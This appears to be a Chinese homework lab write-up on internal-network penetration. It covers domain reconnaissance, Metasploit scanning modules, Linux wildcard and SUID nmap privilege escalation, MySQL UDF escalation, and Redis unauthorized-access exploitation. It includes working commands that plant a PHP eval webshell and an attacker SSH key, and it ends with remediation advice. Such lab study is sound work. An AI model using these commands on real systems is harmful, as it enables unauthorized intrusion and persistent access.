msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre>



<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" alt="image-20210511195019515" style="zoom:50%;">

<p>设置完代理后攻击者主机就可以访问内网了</p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器</span>
net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>
net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>
net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#查看域内所有的主机名</span>
net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#查看域管理员</span>
net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#查看域控</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" alt="image-20210511200502702" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" alt="image-20210511200553874" style="zoom:50%;"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" alt="image-20210511200623757" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" alt="image-20210511200650884" style="zoom:50%;"></p>
<p>汇总</p>
<p>从域信息收集可以得到以下信息：</p>
<ul>
<li><p>域：god.org</p>
</li>
<li><p>域内有三个用户：administrator、ligang、liukaifeng01</p>
</li>
<li><p>域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1</p>
</li>
<li><p>域控：OWA(192.168.52.138)</p>
</li>
<li><p>域管理员：administrator</p>
</li>
</ul>
<p>由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。</p>
<h3 id="内网主机信息收集"><a href="#内网主机信息收集" class="headerlink" title="内网主机信息收集"></a>内网主机信息收集</h3><p>远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机</p>
<p>当然之前已经设置完代理了，也可以使用kali中的msf探测</p>
<h3 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h3><p>因为之前的代理搭建存在问题，导致这一步不能做，就在网上找了一些相关操作</p>
<p>在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/92556219">后渗透阶段之基于MSF的内网主机探测</a></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span></code></pre>

<h3 id="内网存活主机端口扫描"><a href="#内网存活主机端口扫描" class="headerlink" title="内网存活主机端口扫描"></a>内网存活主机端口扫描</h3><p><strong>使用MSF自带模块进行端口探测</strong></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描(默认扫描1-10000)</span></code></pre>

<p><strong>也可以用nmap扫描</strong></p>
<h3 id="内网存活主机服务探测"><a href="#内网存活主机服务探测" class="headerlink" title="内网存活主机服务探测"></a>内网存活主机服务探测</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#探测内网http服务的标题</span>
auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre>





<h1 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h1><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。在执行任何其他操作之前，通配符首先要经过shell进行解释。</p>
<p>下面是一些常见的通配符：</p>
<p>*   星号可以与文件名中的任意数量的字符匹配，包括0个字符。</p>
<p> ?   问号用于匹配任意单个字符。</p>
<p>[ ]  括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。</p>
<p> –   []中的连字符表示字符范围。</p>
<p>~   单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。</p>
<p><strong>利用chown的<code>--reference</code>参数提权</strong></p>
<p>–reference=&lt;参考文件或目录&gt;：把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。</p>
<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>实验环境<code>ubuntu18.04</code></p>
<p>首先创建一个hacker用户</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">adduser hacker</span></code></pre>

<p>登录sunzy账号，在<code>home/sunzy/test</code> 随便写一些文件，作为实验参考对象</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165902255.png" alt="image-20210417165902255"></p>
<p>登录hacker账号，并且在test目录下写两个文件</p>
<p>这里需要实验su命令提升权限，并且将所有者和用户组改为hacker</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417170157713.png" alt="image-20210417170157713"></p>
<p>其中hacker.php与’–reference=hacker.php’中的名字需要一致</p>
<p>使用root权限在<code>/home/sunzy/test/</code>执行</p>
<pre><code class="hljs apache"><span class="hljs-attribute">chown</span> -R hacker<span class="hljs-number">1</span>:hacker<span class="hljs-number">1</span> *.php</code></pre>

<p>结果如下，发现，属于<code>sunzy</code>用户的文件，现在属于hacker，这样hacker就可以对这些文件进行读写操作。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165619087.png" alt="image-20210417165619087" style="zoom:50%;">





<h2 id="linux-SUID提权"><a href="#linux-SUID提权" class="headerlink" title="linux SUID提权"></a>linux SUID提权</h2><h3 id="关于SUID"><a href="#关于SUID" class="headerlink" title="关于SUID"></a>关于SUID</h3><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
<h3 id="查找具有-SUID-权限位文件"><a href="#查找具有-SUID-权限位文件" class="headerlink" title="查找具有 SUID 权限位文件"></a>查找具有 SUID 权限位文件</h3><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
<pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre>

<p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233650739.png" alt="image-20210425233650739" style="zoom:50%;">

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>nmap</strong></p>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<pre><code class="hljs ada">nmap <span class="hljs-comment">--interactive</span></code></pre>

<p>之后执行:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">nmap</span>&gt; !sh
<span class="hljs-attribute">sh</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span># whoami
<span class="hljs-attribute">root</span></code></pre>

<p>msf中的模块为：</p>
<pre><code class="hljs awk">exploit<span class="hljs-regexp">/unix/</span>local/setuid_nmap</code></pre>

<p>较新版可使用 <code>--script</code> 参数：</p>
<pre><code class="hljs arcade">echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.nse &amp;&amp; sudo nmap --script=<span class="hljs-regexp">/tmp/</span>shell.nse</code></pre>

<p>kali nmap 7.7 提权成功：</p>
<p><img src="https://jlkl.github.io/2020/01/27/Web_15/20200127154030.png" alt></p>
<h2 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h2><h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</p>
<p>这里使用mysql进行复现。</p>
<p>首先我们需要拥有mysql数据库的root权限，由于mysql的版本不同，udf提权的方式也不同。</p>
<p>mysql版本&gt;5.1 需要在mysql的安装目录下创建 lib\plugin 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中；<br>mysql版本&lt;5.1 需要将dll文件放在 C:\windows\或C:\windows\system32。</p>
<p>然后加载函数，就可以使用了。</p>
<p>注意：提权所用的dll在sqlmap或msf中都有，要与受害机的系统与数据库位数进行匹配。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806175635321.png" alt="在这里插入图片描述"></p>
<h3 id="msf提权演示"><a href="#msf提权演示" class="headerlink" title="msf提权演示"></a>msf提权演示</h3><p>这里主要演示大于5.1的版本。<br>所以接下来创建目录，关于创建目录，下面的第二篇参考提供了一个使用NTFS ADS流的方式，大家可以进行尝试，这里我直接手工进行创建。</p>
<p>然后我们需要把自定义好的函数，也就是执行系统命令的函数加载进数据库中，我们需要先将定义好的一个dll放入lib\plugin这个文件夹，这里如果无法上传文件，我们可以创建一个数据表，将dll中的数据十六进制编码，之后在通过读取的方式写入到lib\plugin\udf.dll文件中，这样也是可以达到上传文件的效果的。<br>写入文件有一个前提，就是secure_file_priv这个选项需要为空值，这样才可以加载或写入文件。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173131434.png" alt="在这里插入图片描述"></p>
<p>NULL表示不可以写入<br>修改mysql.ini文件，使其为空值</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173252232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pbmdfeHQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这样一来就可以写入文件了。</p>
<p>但是这里我们利用msf进行攻击，需要远程连接该主机的数据库，所以要提前查看，该数据库是否可以远程连接。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173304225.png" alt="在这里插入图片描述"></p>
<p>这里发现root用户的连接对象都是本地，可以使用sql语句进行修改，将其改为允许远程连接</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;</code></pre>


<p>这条语句来修改连接对象为所有主机<br>之后尝试使用msf进行攻击。</p>
<p>进入msf，加载exploit/multi/mysql/mysql_udf_payload模块</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233528810.png" alt="image-20210425233528810" style="zoom:67%;">

<p>这里的需要mysql数据库的账号和密码，以及连接的主机。<br>设置完之后，尝试攻击。<br>攻击完之后，在受害机的lib\plugin目录下将会生成一个dll文件。<br>之后查看已载入的函数并尝试执行。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233540791.png" alt="image-20210425233540791" style="zoom:50%;">

<p>执行成功返回0。<br>由于该命令没有回显，不方便，所以我们需要手动的加载一个有回显的函数。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233551282.png" alt="image-20210425233551282" style="zoom:67%;">

<p>这里的dll文件的名称是msf随机的，利用该条命令载入了sys_eval函数</p>
<p><img src="https://img-blog.csdnimg.cn/20200806174919488.png" alt="在这里插入图片描述"></p>
<p>可以看到该条函数成功将执行结果回显出来了。</p>
<h1 id="redis未授权访问漏洞利用"><a href="#redis未授权访问漏洞利用" class="headerlink" title="redis未授权访问漏洞利用"></a>redis未授权访问漏洞利用</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>该漏洞的产生条件有以下两点：</p>
<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
<pre><code class="hljs awk">创建redis安装目录
mkdir <span class="hljs-regexp">/usr/</span>local/redis
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
<span class="hljs-regexp">//</span>获取redis压缩包
tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
make <span class="hljs-comment">#编译安装</span></code></pre>

<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
<p>vim redis.conf #修改默认配置文件</p>
<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387" style="zoom:67%;">



<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
<pre><code class="hljs awk">cd src
cp redis-cli <span class="hljs-regexp">/usr/</span>bin
cp redis-server <span class="hljs-regexp">/usr/</span>bin
cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre>

<p>开启redis服务</p>
<pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311" style="zoom:50%;">

<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
<p>攻击机</p>
<p>ip:192.168.164.145</p>
<p>目标主机</p>
<p>ip:192.168.164.23</p>
<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841" style="zoom:67%;">



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h3><p>首先进入redis安装目录的src中执行</p>
<pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre>

<p>成功控制目标的redis服务</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p>
<p>向其网站根目录中写入一句话木马</p>
<pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>

<span class="xml">config set dbfilename shell.php</span>

<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>

<span class="xml">save </span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p>
<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p>
<p>使用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612" style="zoom:50%;">





<h3 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h3><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
<p>首先生成公钥密钥文件</p>
<pre><code class="hljs awk">ssh-keygen -t rsa

cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830" style="zoom:50%;">

<p>继续使用命令</p>
<pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>

config <span class="hljs-keyword">set</span> authorized_keys

<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>

save</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309" style="zoom: 67%;">



<p>使用公钥连接</p>
<pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre>

<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p>
<h3 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h3><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
<p>3、修改默认端口</p>
]]></content>
      <categories>
        <category>homework</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
</search>
